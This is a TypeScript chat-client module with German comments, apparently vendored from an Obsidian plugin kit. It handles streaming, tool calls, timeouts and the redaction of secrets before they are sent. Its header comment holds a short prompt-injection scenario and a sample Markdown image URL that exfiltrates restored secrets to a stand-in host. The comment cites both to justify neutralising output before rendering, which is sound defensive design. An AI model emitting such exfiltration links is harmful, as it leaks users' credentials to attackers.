// vendored from obsidian-kit@0.51.2, src/obsidian/chat-client.ts — do not hand-edit; re-vendor via tools/sync-kit.sh
/** Ein Chat-Aufruf gegen `/v1/chat/completions` (OpenAI-kompatibel) — Streaming, Tool-Calls,
 *  Abbruch, Idle-Timeout, Fehlerbody, Fallback ohne Stream. Kein `obsidian`-Import: der Transport
 *  wird injiziert (`chat-transport.ts` liefert XHR und `requestUrl`), die Uhr ebenso. Damit ist
 *  der ganze Client in Node gegen einen Fake-Transport testbar.
 *
 *  Herkunft (Welle 8, 2026-09-25): Vorlage `koda-agent/src/llm/KodaChatClient.ts` — der einzige
 *  der zehn Clients im Bestand mit Tool-Call-Runden, Abbruch und Idle-Timeout. Dazu aus
 *  `vault-crews/src/core/local-llm-client.ts` und `slide-deck/src/llm-client.ts` der Fallback ohne
 *  Stream nach `StreamNetworkError`, aus `slide-deck`/`image-to-markdown` die Prüfung auf HTTP 200
 *  mit Fehlerkörper, aus `lingotuner/src/core/llm/client.ts` die Trennung „Plugin baut `params`,
 *  Client schickt sie". Die Vergleichstabelle der zehn liegt in der Auftragsnote kit-w8.
 *
 *  ── Was der Client bewusst NICHT tut ─────────────────────────────────────────────────────────
 *  **Keine Sampling-Werte.** `params` kommt vom Plugin, üblicherweise aus
 *  `resolveRequestParams(...).params` (`code-kit` `sampling-profiles`), übergangsweise aus
 *  `suppressParams`. Nur das Plugin kennt seinen Modus; ein Client mit festem `temperature`
 *  überstimmte die Tabelle still.
 *  **Kein Gesamt-Timeout.** Die Frist misst Stille, nicht Dauer (REGISTRY „Der Timeout eines
 *  LLM-Streams muss ein IDLE-Timeout sein"). Wer ein Gesamtbudget braucht (unbeaufsichtigte
 *  Läufe), bricht über sein eigenes `signal` ab — das Ergebnis heißt dann `aborted`.
 *  **Keine Anzeigetexte.** `detail` ist die Servermeldung bzw. ein technischer Kurztext; den Satz
 *  für die Nutzerin baut der Konsument aus `kind` in seiner Sprache.
 *
 *  ── Fallback ohne Stream ─────────────────────────────────────────────────────────────────────
 *  Ein XHR-Stream im Renderer sendet `Origin: app://obsidian.md`; ein lokaler Server mit
 *  Origin-Prüfung weist ihn ab, während `requestUrl` (Hauptprozess, kein Origin) durchkommt. Mit
 *  `fallbackTransport` wiederholt der Client die Anfrage nach einem `StreamNetworkError` einmal
 *  ohne Stream und bleibt danach dabei — **je Client-Instanz**. Wer den Endpunkt wechselt, erzeugt
 *  den Client neu; sonst trägt der neue Endpunkt die Weigerung des alten. Ein Netzfehler im
 *  Fallback selbst ist `network`, es gibt keine zweite Runde. Schon gestreamter Text sperrt den
 *  Fallback (er lieferte dieselben Token noch einmal).
 *
 *  ── Schwärzung (Default an, seit 0.51.0) ─────────────────────────────────────────────────────
 *  Geheimnisse im Verlauf (PEM-Blöcke, Bearer, Präfix-Tokens, AKIA) gehen nie im Klartext an den
 *  Server. `complete()` legt EINE `RedactionSession` an (code-kit `redact`) und schwärzt damit eine
 *  KOPIE der Nachrichten, bevor die Anfrage gebaut wird: String-`content` und Teile
 *  `{type:"text"}`, auch bei `role: "system"` und `"tool"`; andere Teile (`image_url`, data-URLs)
 *  bleiben unberührt. `req.messages` wird nicht verändert. Der Fallback ohne Stream nutzt dieselbe
 *  Session (kein doppeltes Zählen). Der Transport-Body trägt nur nummerierte Platzhalter
 *  (`[redacted-token-1]`).
 *
 *  **Der Rückweg ist umkehrbar:** Stream-Token (`onToken`, `onReasoning`) laufen durch
 *  `session.restorer()`, der Endtext (`content`, `reasoning`, `partial`) und `toolCalls[].arguments`
 *  durch `restore`. Der Konsument bekommt also die Originale — ein Rückschreiber (Notiz, Tool-Argument)
 *  verliert nichts. Nicht restauriert werden `detail` und `body` eines Fehlers.
 *
 *  Grenzen: (1) Formuliert das Modell einen Platzhalter um (`[redacted token 1]`, eine Übersetzung),
 *  bleibt er stehen; das Original geht nicht verloren, die Nutzerin sieht aber den Platzhalter.
 *  (2) **Restaurierter Text geht nur über Neutralisierung an einen Renderer, nie ungeprüft an das Netz
 *  oder an `fetch`:** `restore` setzt das Original überall ein, wo der Platzhalter steht; ein
 *  prompt-injiziertes Modell kann ihn in eine Bild-URL schreiben (`![x](https://evil.example/?d=[…])`).
 *  `stable-writer` neutralisiert deshalb vor dem Rendern (Bilder werden Text, `<` wird `&lt;`);
 *  eigene Render-Wege rufen `neutralizeModelMarkdown`. Ein klickbarer Link bleibt möglich — eine
 *  dokumentierte Restgrenze, kein Auto-Abfluss. (3) Auch die GESENDETEN `tool_calls[].function.arguments` (frühere Assistenten-Runden) laufen durch die Session: bekannte
 *  Originale in Roh- und JSON-escapter Form, Unbekanntes über die Muster, das Argument bleibt gültiges JSON — sonst
 *  trüge Runde 2 eines Agenten-Verlaufs das restaurierte Original im Klartext zurück zum Server. (4) Eigene Regeln
 *  dürfen keine Platzhalter treffen (siehe `redact`). (5) Ein Bearer-Treffer ersetzt den ganzen
 *  Ausdruck samt dem Wort „Bearer“. `redactions` zählt verschiedene Werte, nicht Vorkommen.
 *  `redact: false` schaltet alles ab. */
import { parseSSE, type ToolCallDelta } from "../kit/sse";
import { ThinkSplitter } from "../kit/think-splitter";
import { normalizeEndpoint } from "../kit/endpoint";
import { authHeaders, type EndpointConfig } from "../kit/endpoint_config";
import { errorMessageFromText } from "../kit/error_body";
import { createRedactionSession, DEFAULT_REDACT_RULES, type RedactionSession, type RedactRules } from "../kit/redact";
import { realClock, type ClockPort } from "./clock";

/** Der Transport-Vertrag der Koda-Linie (koda-agent, kuro-gamification, neurovim-obsidian):
 *  schickt `body` als JSON, reicht jeden neuen Rohtext-Abschnitt an `onChunk` und löst mit dem
 *  HTTP-Status auf — **auch bei Nicht-2xx**, der Client braucht den Fehlerkörper. Abbruch über
 *  `signal` → Ablehnung mit `name === "AbortError"`; ein Netzfehler vor jeder Antwort →
 *  `name === "StreamNetworkError"` (Auslöser des Fallbacks). */
export interface SseTransport {
  postStream(
    url: string,
    body: unknown,
    headers: Record<string, string>,
    onChunk: (raw: string) => void,
    signal: AbortSignal,
  ): Promise<number>;
}

/** Eine Nachricht, wie sie auf die Leitung geht. `content` ist `unknown`, weil multimodale
 *  Nachrichten ein Array tragen (image-to-markdown). */
export interface ChatWireMessage {
  role: string;
  content: unknown;
  tool_calls?: unknown;
  tool_call_id?: string;
  name?: string;
}

export interface ChatRequest {
  endpoint: EndpointConfig;
  /** Das Modell, wie es gesendet wird — nach `aliasOf`-Auflösung (`endpoint-source` `sentModel`). */
  model: string;
  messages: readonly ChatWireMessage[];
  /** Sampling- und Denk-Felder, flach in den Body gemischt. `model`, `messages`, `stream` und
   *  `tools` setzt der Client selbst; gleichnamige Schlüssel hier werden ignoriert. */
  params?: Record<string, unknown>;
  /** Werkzeuge in Leitungsform (`{type:"function", function:{…}}`). Leer = kein `tools`-Feld. */
  tools?: readonly unknown[];
  /** Default `true`. `false` fragt eine volle Completion ab (`stream:false`). */
  stream?: boolean;
  signal?: AbortSignal;
  onToken?: (text: string) => void;
  onReasoning?: (text: string) => void;
  /** Feuert einmal je Tool-Call, sobald sein Name feststeht — für die Statuszeile, bevor die
   *  Stille der gepufferten Argumente beginnt. */
  onToolCallHead?: (name: string) => void;
  /** Wie `content` restauriert wird: `"text"` (Default) setzt Originale roh ein; `"json"` setzt sie
   *  JSON-maskiert ein (Zeilenumbruch → `\\n`), damit ein Platzhalter in einem JSON-String — ein mehrzeiliger PEM
   *  — gültiges JSON bleibt. Für Konsumenten, die JSON aus `content` parsen. Gilt für `content` und `partial` im
   *  Ergebnis; `onToken` und `onReasoning` liefern weiter Anzeigetext, `content` ist bei `"json"` also NICHT die
   *  Verkettung der Token. */
  restoreContent?: "text" | "json";
}

export interface ToolCall { id: string; name: string; arguments: string }

/** Millisekunden aus der injizierten Uhr. `firstChunkAt` fehlt, wenn kein Byte ankam — die
 *  Zeit bis zum ersten Chunk ist die Größe, die llm-lab als `ttftMs` führt (dort „time to first
 *  token"; gemessen wird hier das erste Byte, auch wenn es Reasoning ist). */
export interface ChatTiming { startedAt: number; firstChunkAt?: number; endedAt: number }

export type ChatErrorKind = "aborted" | "timeout" | "network" | "http" | "overflow" | "truncated";

export type ChatResult =
  | {
    ok: true;
    content: string;
    reasoning: string;
    toolCalls: ToolCall[];
    finishReason?: string;
    /** Das Modell, das der SERVER nennt — kann vom gesendeten abweichen (Alias, Router). */
    model?: string;
    /** `finish_reason: "length"` mit Text — gültig, aber am Token-Limit abgeschnitten. */
    truncated: boolean;
    /** `false`, wenn die Antwort als volle Completion kam (ohne Stream oder über den Fallback). */
    streamed: boolean;
    timing: ChatTiming;
    /** Verschiedene Werte, die vor dem Senden geschwärzt wurden (`createChatClient` setzt es immer, 0 ohne Schwärzung). */
    redactions?: number;
  }
  | {
    ok: false;
    kind: ChatErrorKind;
    /** Servermeldung (aus dem JSON-Fehlerkörper) oder technischer Kurztext, eine Zeile. */
    detail: string;
    /** Bis zum Fehler gelieferter Text. */
    partial: string;
    reasoning: string;
    status?: number;
    /** Roher Fehlerkörper, gekürzt auf 2048 Zeichen. */
    body?: string;
    timing: ChatTiming;
    /** Wie im Erfolgszweig. */
    redactions?: number;
  };

export interface ChatClientOptions {
  transport: SseTransport;
  /** Transport für die Wiederholung ohne Stream nach `StreamNetworkError` (üblich:
   *  `requestUrlTransport`). Ohne ihn ist ein Netzfehler sofort `network`. */
  fallbackTransport?: SseTransport;
  clock?: ClockPort;
  /** Stille seit dem letzten Chunk, nach der abgebrochen wird. Default 120 s. */
  idleTimeoutMs?: number;
  /** Frist bis zum ERSTEN Chunk (JIT-ladende Modelle brauchen Minuten). Default = `idleTimeoutMs`. */
  firstChunkTimeoutMs?: number;
  /** Frist ab dem Kopf-Chunk eines Tool-Calls. LM Studio streamt Tool-Argumente nicht, es puffert
   *  sie: nach dem Kopf kommt kein Byte, bis alle Argumente fertig sind (llm-setup `6f75737`).
   *  Default 900 s. */
  toolCallIdleTimeoutMs?: number;
  /** Frist für eine Anfrage ohne Stream — dort gibt es kein Lebenszeichen, also ist sie die
   *  ganze Wartezeit. Default 900 s. */
  nonStreamTimeoutMs?: number;
  /** Schwärzung vor dem Senden (Kopfkommentar). Default an mit `DEFAULT_REDACT_RULES` (Geheimnisse);
   *  `{ rules }` ersetzt den Regelsatz (E-Mail ist Opt-in: `[...SECRET_REDACT_RULES, EMAIL_REDACT_RULE]`);
   *  `false` schaltet sie ab. */
  redact?: false | { rules?: RedactRules };
}

export interface ChatClient {
  complete(req: ChatRequest): Promise<ChatResult>;
}

export const DEFAULT_IDLE_TIMEOUT_MS = 120_000;
/** Frist bis zum ERSTEN Chunk für lokale Endpunkte: LM Studio und Ollama laden das Modell beim
 *  ersten Aufruf per JIT (Minuten bei großen Modellen oder langem Prompt), erst danach kommt ein
 *  Byte. Gemessen als drei eigene Kopien derselben Zahl in slide-deck (`llm-client.ts`),
 *  image-to-markdown (`vision_client.ts`) und vault-rag (`chat_client.ts`), die jeweils die
 *  Standardfrist von 120 s aufgehoben haben; kuro, neurovim und yijing liefen ohne sie in dieselbe
 *  Falle. `createChatClient` selbst behält `firstChunkTimeoutMs = idleTimeoutMs` als Default
 *  (der Client kennt den Endpunkt nicht); `createLlmConnection` setzt diesen Wert. */
export const JIT_FIRST_CHUNK_TIMEOUT_MS = 600_000;
export const DEFAULT_TOOL_CALL_IDLE_TIMEOUT_MS = 900_000;
export const DEFAULT_NON_STREAM_TIMEOUT_MS = 900_000;
const ERROR_BODY_CAP = 2048;
const DETAIL_CAP = 200;
// übernommen aus vault-crews/src/core/chat-response.ts (via koda-agent/src/core/llm/chat-error.ts),
// 2026-09-25 — bewusst nicht in code-kit (Kopf von error_body.ts: eigene Zählung).
const OVERFLOW_RE = /context (length|window)|too many tokens|maximum context length/i;
const RESERVED = new Set(["model", "messages", "stream", "tools"]);

function isRecord(v: unknown): v is Record<string, unknown> {
  return typeof v === "object" && v !== null && !Array.isArray(v);
}

function oneLine(s: string): string {
  const t = s.replace(/\s+/g, " ").trim();
  return t.length > DETAIL_CAP ? `${t.slice(0, DETAIL_CAP)}…` : t;
}

function namedErrorName(e: unknown): string {
  return e instanceof Error ? e.name : "";
}

type RedactTarget = Pick<RedactionSession, "redact" | "restore">;

const PLACEHOLDER_RE = /\[redacted-[a-z0-9-]+-\d+\]/g;

function redactContent(content: unknown, session: RedactTarget): unknown {
  if (typeof content === "string") return session.redact(content);
  if (!Array.isArray(content)) return content;
  return content.map((part: unknown) =>
    isRecord(part) && part.type === "text" && typeof part.text === "string" ? { ...part, text: session.redact(part.text) } : part);
}

/** Argument-JSON eines gesendeten Tool-Calls: erst die BEKANNTEN Originale (Platzhalter aus den
 *  Texten dieses Aufrufs) in Roh- UND JSON-escapter Form durch ihren Platzhalter ersetzen — ein Original mit
 *  Zeilenumbruch, `"` oder `\` steht im Argument-JSON maskiert, die Rohsuche fände es nie —, dann die
 *  Muster für Unbekanntes. Das Ergebnis bleibt gültiges JSON (sonst wird es als Zeichenkette verpackt). */
function redactArguments(args: string, known: ReadonlySet<string>, session: RedactTarget): string {
  const needles: Array<[string, string]> = [];
  for (const ph of known) {
    const original = session.restore(ph);
    if (original === ph || original === "") continue;
    const escaped = JSON.stringify(original).slice(1, -1);
    needles.push([escaped, ph]);
    if (escaped !== original) needles.push([original, ph]);
  }
  needles.sort((a, b) => b[0].length - a[0].length);
  let out = args;
  for (const [needle, ph] of needles) out = out.split(needle).join(ph);
  out = session.redact(out);
  try { JSON.parse(args); } catch { return out; }   // war schon kein JSON: nichts zu bewahren
  try { JSON.parse(out); return out; } catch { return JSON.stringify({ redacted: out }); }
}

function redactToolCalls(toolCalls: unknown, known: ReadonlySet<string>, session: RedactTarget): unknown {
  if (!Array.isArray(toolCalls)) return toolCalls;
  return toolCalls.map((tc: unknown) => {
    if (!isRecord(tc) || !isRecord(tc.function)) return tc;
    const args = tc.function.arguments;
    if (typeof args === "string") return { ...tc, function: { ...tc.function, arguments: redactArguments(args, known, session) } };
    if (isRecord(args)) return { ...tc, function: { ...tc.function, arguments: JSON.parse(redactArguments(JSON.stringify(args), known, session)) as unknown } };
    return tc;
  });
}

function redactWith(messages: readonly ChatWireMessage[], session: RedactTarget): ChatWireMessage[] {
  // Durchgang 1: die Texte; die ausgegebenen Platzhalter sind die bekannten Originale dieses Aufrufs.
  const known = new Set<string>();
  const texts = messages.map((m) => {
    const content = redactContent(m.content, session);
    const flat = typeof content === "string" ? content : JSON.stringify(content) ?? "";
    for (const ph of flat.match(PLACEHOLDER_RE) ?? []) known.add(ph);
    return content;
  });
  // Durchgang 2: gesendete Tool-Call-Argumente (Runde 2 eines Agenten-Verlaufs trägt das Original sonst im Klartext).
  return messages.map((m, i) => {
    const out: ChatWireMessage = { ...m, content: texts[i] };
    if (m.tool_calls !== undefined) out.tool_calls = redactToolCalls(m.tool_calls, known, session);
    return out;
  });
}

/** Die Schwärzung des Clients als eigene Funktion — damit eine Vorschau den GESENDETEN Text zeigen
 *  kann (image-to-markdown, vault-rag) samt Zahl für die Zeile „N Stellen geschwärzt“. Gibt Kopien
 *  zurück, die Eingabe bleibt unverändert; gleicher Wert → gleicher Platzhalter. Umfang und Grenzen
 *  wie im Kopfkommentar (Text-Teile aller Rollen und gesendete Tool-Argumente; Bildteile nicht). */
export function redactMessages<M extends ChatWireMessage>(messages: readonly M[], rules: RedactRules = DEFAULT_REDACT_RULES): { messages: M[]; count: number } {
  const session = createRedactionSession(rules);
  const out = redactWith(messages, session) as M[];
  return { messages: out, count: session.count };
}

/** Setzt Originale in einen JSON-Text ein: die Platzhalter stehen in Zeichenketten, also wird der Wert
 *  JSON-maskiert (ein PEM-Block trägt Zeilenumbrüche, rohes `restore` machte das JSON ungültig). */
function restoreInJson(session: RedactionSession, json: string): string {
  return json.replace(/\[redacted-[a-z0-9-]+-\d+\]/g, (ph) => {
    const original = session.restore(ph);
    return original === ph ? ph : JSON.stringify(original).slice(1, -1);
  });
}

class ToolCallAssembler {
  private readonly map = new Map<number, { id: string; name: string; args: string }>();
  push(d: ToolCallDelta): void {
    const e = this.map.get(d.index) ?? { id: "", name: "", args: "" };
    if (d.id !== undefined) e.id = d.id;
    if (d.name !== undefined) e.name = d.name;
    if (d.argsDelta !== undefined) e.args += d.argsDelta;
    this.map.set(d.index, e);
  }
  finish(): ToolCall[] {
    return [...this.map.entries()]
      .sort(([a], [b]) => a - b)
      .filter(([, e]) => e.name !== "")
      .map(([index, e]) => ({ id: e.id !== "" ? e.id : `call_${index}`, name: e.name, arguments: e.args }));
  }
}

/** Volle Completion (`choices[0].message`) — ohne Stream, oder wenn ein Server `stream:true`
 *  ignoriert. `null`, wenn der Körper keine Completion ist. */
function readCompletion(body: string): { content: string; reasoning: string; toolCalls: ToolCall[]; finishReason?: string; model?: string } | null {
  let j: unknown;
  try { j = JSON.parse(body); } catch { return null; }
  if (!isRecord(j) || !Array.isArray(j.choices)) return null;
  const c0: unknown = j.choices[0];
  if (!isRecord(c0) || !isRecord(c0.message)) return null;
  const m = c0.message;
  const reasoning = [m.reasoning_content, m.reasoning, m.thinking].find((v): v is string => typeof v === "string" && v !== "") ?? "";
  const toolCalls: ToolCall[] = [];
  if (Array.isArray(m.tool_calls)) {
    m.tool_calls.forEach((tc: unknown, i: number) => {
      if (!isRecord(tc)) return;
      const fn = isRecord(tc.function) ? tc.function : {};
      if (typeof fn.name !== "string" || fn.name === "") return;
      toolCalls.push({
        id: typeof tc.id === "string" && tc.id !== "" ? tc.id : `call_${i}`,
        name: fn.name,
        arguments: typeof fn.arguments === "string" ? fn.arguments : JSON.stringify(fn.arguments ?? {}),
      });
    });
  }
  return {
    content: typeof m.content === "string" ? m.content : "",
    reasoning,
    toolCalls,
    ...(typeof c0.finish_reason === "string" && c0.finish_reason !== "" ? { finishReason: c0.finish_reason } : {}),
    ...(typeof j.model === "string" && j.model !== "" ? { model: j.model } : {}),
  };
}

export function createChatClient(opts: ChatClientOptions): ChatClient {
  const clock = opts.clock ?? realClock;
  const idleMs = opts.idleTimeoutMs ?? DEFAULT_IDLE_TIMEOUT_MS;
  const firstMs = opts.firstChunkTimeoutMs ?? idleMs;
  const toolMs = opts.toolCallIdleTimeoutMs ?? DEFAULT_TOOL_CALL_IDLE_TIMEOUT_MS;
  const nonStreamMs = opts.nonStreamTimeoutMs ?? DEFAULT_NON_STREAM_TIMEOUT_MS;
  let streamRefused = false;

  async function run(req: ChatRequest, transport: SseTransport, stream: boolean, session: RedactionSession | null): Promise<ChatResult> {
    const startedAt = clock.now();
    let firstChunkAt: number | undefined;
    const timing = (): ChatTiming => ({ startedAt, ...(firstChunkAt !== undefined ? { firstChunkAt } : {}), endedAt: clock.now() });

    let content = "";
    let reasoning = "";
    const back = (t: string): string => (session ? session.restore(t) : t);
    const backContent = (t: string): string => (session && req.restoreContent === "json" ? restoreInJson(session, t) : back(t));
    const redactions = session?.count ?? 0;
    const fail = (kind: ChatErrorKind, detail: string, extra: { status?: number; body?: string } = {}): ChatResult =>
      ({ ok: false, kind, detail, partial: backContent(content), reasoning: back(reasoning), ...extra, timing: timing(), redactions });

    if (req.signal?.aborted) return fail("aborted", "aborted before start");

    const body: Record<string, unknown> = {};
    for (const [k, v] of Object.entries(req.params ?? {})) if (!RESERVED.has(k)) body[k] = v;
    body.model = req.model;
    body.messages = req.messages;
    body.stream = stream;
    if (req.tools && req.tools.length > 0) body.tools = req.tools;
    const url = `${normalizeEndpoint(req.endpoint.url)}/v1/chat/completions`;
    const headers = authHeaders(req.endpoint.apiKey);

    const ctrl = new AbortController();
    const onCallerAbort = (): void => ctrl.abort();
    req.signal?.addEventListener("abort", onCallerAbort, { once: true });

    let timedOutAfter: number | null = null;
    let waitMs = stream ? firstMs : nonStreamMs;
    const fire = (): void => { timedOutAfter = waitMs; ctrl.abort(); };
    let timer = clock.setTimeout(fire, waitMs);
    const rearm = (ms: number): void => {
      waitMs = ms;
      clock.clearTimeout(timer);
      timer = clock.setTimeout(fire, ms);
    };

    const splitter = new ThinkSplitter();
    const assembler = new ToolCallAssembler();
    const heads = new Set<number>();
    let sawToolCall = false;
    let sawSse = false;
    let finishReason: string | undefined;
    let model: string | undefined;
    let rest = "";
    let raw = "";

    // Stream-Token laufen durch einen Restaurierer (ein Platzhalter kann über Chunks verteilt sein);
    // `content`/`reasoning` bleiben der Rohstrom und werden erst am Ende restauriert.
    const contentBack = session?.restorer();
    const reasoningBack = session?.restorer();
    const emit = (c: string, r: string): void => {
      if (c !== "") { content += c; const o = contentBack ? contentBack.push(c) : c; if (o !== "") req.onToken?.(o); }
      if (r !== "") { reasoning += r; const o = reasoningBack ? reasoningBack.push(r) : r; if (o !== "") req.onReasoning?.(o); }
    };
    const drainSplitter = (): void => {
      const tail = splitter.flush();
      emit(tail.content, tail.reasoning);
      const c = contentBack?.flush() ?? "";
      if (c !== "") req.onToken?.(c);
      const r = reasoningBack?.flush() ?? "";
      if (r !== "") req.onReasoning?.(r);
    };
    const digest = (text: string): void => {
      const p = parseSSE(text);
      const complete = text.slice(0, text.length - p.rest.length);
      rest = p.rest;
      if (!sawSse && /^\s*data:/m.test(complete)) sawSse = true;
      if (model === undefined && p.model) model = p.model;
      if (finishReason === undefined && p.finishReason) finishReason = p.finishReason;
      for (const r of p.reasoning) emit("", r);
      for (const c of p.content) { const s = splitter.push(c); emit(s.content, s.reasoning); }
      for (const d of p.toolCalls) {
        assembler.push(d);
        sawToolCall = true;
        if (d.name !== undefined && !heads.has(d.index)) {
          heads.add(d.index);
          req.onToolCallHead?.(d.name);
        }
      }
    };
    const onChunk = (chunk: string): void => {
      firstChunkAt ??= clock.now();
      raw += chunk;
      if (stream) digest(rest + chunk);
      if (stream) rearm(sawToolCall ? toolMs : idleMs);
    };

    let status: number;
    try {
      status = await transport.postStream(url, body, headers, onChunk, ctrl.signal);
    } catch (e) {
      drainSplitter();
      if (namedErrorName(e) === "AbortError") {
        return timedOutAfter !== null
          ? fail("timeout", `no data for ${timedOutAfter / 1000}s`)
          : fail("aborted", "aborted");
      }
      if (namedErrorName(e) === "StreamNetworkError" && opts.fallbackTransport && stream && raw === "") {
        streamRefused = true;
        cleanup();
        return run(req, opts.fallbackTransport, false, session);
      }
      return fail("network", e instanceof Error ? e.message : "network error");
    } finally {
      cleanup();
    }

    function cleanup(): void {
      clock.clearTimeout(timer);
      req.signal?.removeEventListener("abort", onCallerAbort);
    }

    // Eine letzte data-Zeile ohne abschließenden Zeilenumbruch liegt noch in `rest`.
    if (stream && rest.trim() !== "") digest(`${rest}\n`);
    drainSplitter();

    if (status < 200 || status >= 300) {
      const detail = errorMessageFromText(raw) ?? (oneLine(raw) || `HTTP ${status}`);
      return fail(OVERFLOW_RE.test(raw) ? "overflow" : "http", detail, { status, body: raw.slice(0, ERROR_BODY_CAP) });
    }

    let streamed = true;
    let toolCalls: ToolCall[];
    if (!sawSse && raw.trim() !== "") {
      const done = readCompletion(raw);
      if (done === null) {
        const envelope = errorMessageFromText(raw, { bodyMayBeSuccess: true });
        const detail = envelope ?? oneLine(raw);
        return fail(OVERFLOW_RE.test(raw) ? "overflow" : "http", detail, { status, body: raw.slice(0, ERROR_BODY_CAP) });
      }
      streamed = false;
      const s = splitter.push(done.content);
      emit(s.content, s.reasoning);
      if (done.reasoning !== "") emit("", done.reasoning);
      drainSplitter();
      toolCalls = done.toolCalls;
      finishReason = done.finishReason;
      model = done.model;
    } else {
      toolCalls = assembler.finish();
    }

    // Abgeschnitten OHNE Text (bei Reasoning-Modellen der Normalfall: das Denken verbraucht das
    // Budget) ist ein Fehler, keine leere Erfolgsmeldung — REGISTRY „Abgeschnittene LLM-Antwort".
    if (finishReason === "length" && content === "") return fail("truncated", "finish_reason: length, no text");

    return {
      ok: true,
      content: backContent(content),
      reasoning: back(reasoning),
      toolCalls: session ? toolCalls.map((t) => ({ ...t, arguments: restoreInJson(session, t.arguments) })) : toolCalls,
      ...(finishReason !== undefined ? { finishReason } : {}),
      ...(model !== undefined ? { model } : {}),
      truncated: finishReason === "length",
      streamed,
      timing: timing(),
      redactions,
    };
  }

  return {
    complete(req: ChatRequest): Promise<ChatResult> {
      const stream = req.stream ?? true;
      // EINE Session je Aufruf: sie schwärzt eine Kopie, der Fallback und die Rückwandlung teilen sie.
      const session = opts.redact === false ? null : createRedactionSession(opts.redact?.rules ?? DEFAULT_REDACT_RULES);
      const wire: ChatRequest = session ? { ...req, messages: redactWith(req.messages, session) } : req;
      if (stream && streamRefused && opts.fallbackTransport) return run(wire, opts.fallbackTransport, false, session);
      return run(wire, opts.transport, stream, session);
    },
  };
}
